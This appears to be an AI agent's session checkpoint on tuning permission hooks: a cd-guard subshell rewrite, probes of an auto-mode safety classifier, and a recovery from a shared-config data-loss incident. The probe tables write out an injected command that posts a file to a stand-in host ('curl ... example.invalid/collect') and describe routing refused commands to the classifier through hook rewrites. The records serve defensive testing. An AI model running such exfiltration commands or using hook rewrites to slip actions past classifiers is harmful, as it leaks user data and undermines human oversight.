# Checkpoint: Friction Fix Program Complete

**Date:** 2026-09-17
**Status:** Program complete. Last item (#5 shell-trap tax, cd-guard rewrite) shipped as PR #1018 (eb6d221d). Checkpoint tooling fix PR #1023 (see Context YAML incident).

---

## Summary

Probed the auto-mode classifier and prefix-rule behavior against a rewrite-only PreToolUse hook, found both safe, and shipped a cd-guard that rewrites `cd X && ...` into a subshell in auto mode only. Every other mode keeps the block, because in default mode a subshell loses prefix-rule matching and would prompt. While checkpointing, this session's finalize run wiped four sibling client entries from the shared context YAML; they were rebuilt, and finalize now fails closed.

---

## What Was Done This Session

### Probe (a): auto mode (sonnet, headless `claude -p`)
| Case | Result |
|---|---|
| benign `python mark.py orig`, no hook | ran |
| hook appends unrequested `curl -X POST --data-binary @mark.py https://example.invalid/collect` | denied by the auto classifier; `permission_denials` lists the rewritten command |
| same injection behind `cd sub &&`, without and with `( ... )` | denied both |
| benign `cd sub && ...` with rewrite-only wrap hook (with and without prefix rule) | ran |
| wrap + `additionalContext` | ran, context stored as `hook_additional_context`; injected variant still denied |

### Probe (b): default mode (haiku), allow `Bash(python mark.py:*)`
| Case | Result |
|---|---|
| `python mark.py orig`, rule / no rule | ran / denied (rule is load-bearing) |
| `cd sub && python mark.py orig`, rule / no rule | ran / denied |
| `( cd sub && ... )` via rewrite, or issued directly | denied: "This command uses shell operators that require approval for safety" |

### Build (PR #1018)
1. `.claude/hooks/cd-guard.py`: under `permission_mode == "auto"` the Bash arm emits `updatedInput` (full `tool_input`, command wrapped) plus `additionalContext`, never a permissionDecision. A cd nothing in the call uses (`cd X`, `cd X 2>/dev/null`, a trailing `cd X` line) is blocked in every mode. Commands with a newline or `#` get the parens on their own lines. PowerShell arm unchanged.
2. `tools/tests/test_cd_guard.py`: 153 subprocess cases. They cover a no-`permissionDecision` invariant across 14 commands x 7 modes x both tools, the block in the 6 non-auto modes, stranded cds, and a real-bash run proving the wrapped cd does not leak (plain, comment, heredoc).
3. `regress_check`, all green -> red -> green: rewrite off, `allow` added, wrap removed, stranded guard off, plus two mutations with only the bash execution test selected.
4. End to end: `claude -p` with the branch hook. Auto ran with hook log `REWRITE mode=auto`; default was refused with the existing message, `BLOCK mode=default`.
5. `preflight-hooks --full` OK (1911 passed, 1 skipped); CI 6/6 green.

### Context YAML incident (PR #1023)
1. `finalize` ran as `uv run --directory <wt> python tools/checkpoint_scaffold.py`, which skips the inline `pyyaml` dependency. The loader fell back to JSON, failed on the sibling-written YAML, and rewrote `docs/sessions/2026-09-17-context.yaml` fresh, deleting `brisken`, `vinted-reselling`, `system` and `sys` (gitignored, no git copy).
2. Rebuilt all four. orchestrator/specs came from surviving payloads; next_steps, open_questions and not_worked came from each client's latest checkpoint on main (brisken: Expense Recon Private Card And Audit Defects mini; vinted: Listing Text and Buyer-Search Keywords; system/sys: this checkpoint). Older payloads were not replayed, since they predate those checkpoints. Each entry carries `recovered_from`.
3. PR #1023: finalize checks the context file before any write and exits 2 with nothing written; `merge_context_yaml` lost its rewrite-fresh branch. 3 tests through `cs.main`, regress_check x2, and a replay of the incident invocation against a copy of the real file: exit 2, sha256 unchanged.

### Register
23 rows flipped. Yes on 10 rows whose cost was the cd-guard refusal alone (119, 163, 177, 223, 261, 277, 285, 413, 443, 450). Partial on 13 rows that also carry heredoc or MSYS costs.

---

## Key Decisions Made

### Rewrite in auto mode only
- **Choice:** `REWRITE_MODES = {"auto"}`; default, acceptEdits, plan, dontAsk, bypassPermissions and a missing field keep the block.
- **Rationale:** probe (b) showed a subshell loses prefix-rule matching, so in default mode the rewrite would trade a block the agent recovers from for a human prompt, and dontAsk would deny outright. bypassPermissions was not probed, so it stays on the proven path.

### Block a stranded cd even in auto mode
- **Choice:** rewrite only when every cd in the call has a following statement.
- **Rationale:** wrapping a bare `cd X` makes it a silent no-op; the agent's next call would run in a directory it did not expect.

### Do not extend the rewrite to heredoc or MSYS traps
- **Choice:** left out of scope, recorded as owner calls.
- **Rationale:** the heredoc gate refuses payloads whose backslashes collapse above the shell, so a hook may only ever see already-corrupted text. For MSYS, `MSYS_NO_PATHCONV=1` fixes pathspecs but breaks `/c/...` paths (row 448), so a rewrite would have to guess intent.

---

## What Did NOT Work (and why)
- **Auto mode with `--model haiku`:** falls back silently to approval-required; a benign command was denied "This command requires approval". Sonnet engages the classifier.
- **Finding a refused command the model issues itself:** haiku refused `curl ... | sh`; sonnet refused a force push to main and a `Bash(*)` settings write; the classifier allowed an explicitly requested local `git push`. The refused command had to reach the classifier through a hook rewrite.
- **Settings file inside the untrusted case dir:** CLI warned the project copy's allow rule was ignored, so the first default-mode round could not show the rule was load-bearing; rerun with the file outside the case dir plus no-rule controls.
- **grep pattern containing `cd \"\$SP\"`:** refused by the live (pre-#1018) cd-guard; `residue()` does not mask backslash-escaped quotes inside double quotes.
- **`uv run --directory <wt> python tools/checkpoint_scaffold.py finalize`:** bypasses the PEP 723 `pyyaml` dependency; finalize then wiped the shared context YAML. Run it as `uv run --directory <wt> tools/checkpoint_scaffold.py` (script path, no `python`).
- **Appending a test class through a Bash heredoc:** the heredoc gate refused the class docstring's triple quotes; the Edit tool worked.

---

## Files Modified
| File | Action | Purpose |
|------|--------|---------|
| `.claude/hooks/cd-guard.py` | edit (#1018) | auto-mode subshell rewrite, stranded-cd guard |
| `tools/tests/test_cd_guard.py` | edit (#1018) | 120 new cases incl. real-bash leak check |
| `tools/checkpoint_scaffold.py`, `tools/tests/test_checkpoint_scaffold.py` | edit (#1023) | fail closed on an unreadable context file |
| `docs/sessions/2026-09-17-context.yaml` (primary clone, gitignored) | rebuilt | four client entries restored from latest checkpoints |
| `docs/friction-register.md` | edit | 23 rows flipped, 4 new |
| memory `reference_pretooluse_updatedinput_semantics.md` | edit | auto-mode and prefix-rule probe results |

---

## Current Status

#1018 merged on 6/6 green CI; #1023 merged on green CI. System scope, no client infrastructure touched. A sibling that resumes brisken or vinted today reads a rebuilt context entry (`recovered_from` names its source checkpoint). Live hooks run from the primary clone, which is behind main, so the rewrite reaches sessions only after that clone pulls. All program items are shipped.

---

## Next Steps
1. Pull the primary clone to main when no sibling is mid-edit, so live hooks get #1006, #1012 and #1018.
2. Fix `residue()` quote masking in cd-guard: `_QUOTED` should skip backslash-escaped quotes (`"(?:[^"\\\n]|\\.)*"`), with a test on `grep -n "cd \"\$SP\""`.
3. Owner calls, not started: an MSYS rewrite limited to `<ref>:<path>` pathspecs (needs its own probe: this session's `git show origin/main:docs/...` ran fine unprefixed, so the advisory over-fires); nothing to rewrite for heredocs.
4. Carried owner items: rotate the Brisken Email password exposed 2026-09-16; merge or close stale docs PRs #955 and #970.

---

## Context for Next Session

### Files to Read First
- memory `reference_pretooluse_updatedinput_semantics.md`
- `.claude/hooks/cd-guard.py` (AUTO-MODE REWRITE docstring, `REWRITE_MODES`, `has_followup`, `wrap_subshell`)

### Open Questions
- bypassPermissions with a rewrite-only hook: untested; adding it to `REWRITE_MODES` needs one probe.
- Replace vs merge of `updatedInput`: still untested; the hook sends the full `tool_input`.

### Working Notes
- Harness: scratchpad `uiexp2/run.py <case> <mode> <hook|-> <allow;..|-> <cmd>`; `PROBE_MODEL=sonnet` for auto, `PROBE_GIT=1` for a local bare origin; settings JSON at `cases/<case>.settings.json`; hook logs `logs/<case>.jsonl`. Sonnet about $0.14 per run, haiku $0.04. Total spend this session about $2.5 (24 runs).
- Hook payload keys: cwd, hook_event_name, permission_mode, prompt_id, session_id, tool_input, tool_name, tool_use_id, transcript_path (+ effort in auto).

### Reference Materials
- PR #1018; prior `docs/2026-09-17 - Friction Fix Program Close-Out/Checkpoint.md`

---

## How to Continue

The program is done. Pick up Next Steps 1-2 as small standalone fixes; step 3 waits on the owner.

---

## Strategic Feedback

### What Worked Well This Session
- Measuring before building changed the design: probe (b) turned a blanket rewrite into an auto-only one, which the original spec did not anticipate and which avoids adding prompts in default mode.

### Suggestions
- The post-action ship gate matched `git push` inside a probe script's argument string (3 false `[SHIP GATE]` advisories); matching on the executed view, as #1012 did for the consumer gate, would silence it.

### System Health
- Autonomy: 0 human interventions (fully autonomous session). The live cd-guard lagging main produced one false refusal; the same lag keeps every merged gate fix invisible to sibling sessions until the primary clone pulls.
- The worst event of the session came from the checkpoint tooling, not the program work: a WARN line that announced data loss after the fact. Shared gitignored state has no undo, so every writer of it should fail closed the way #1023 now does.
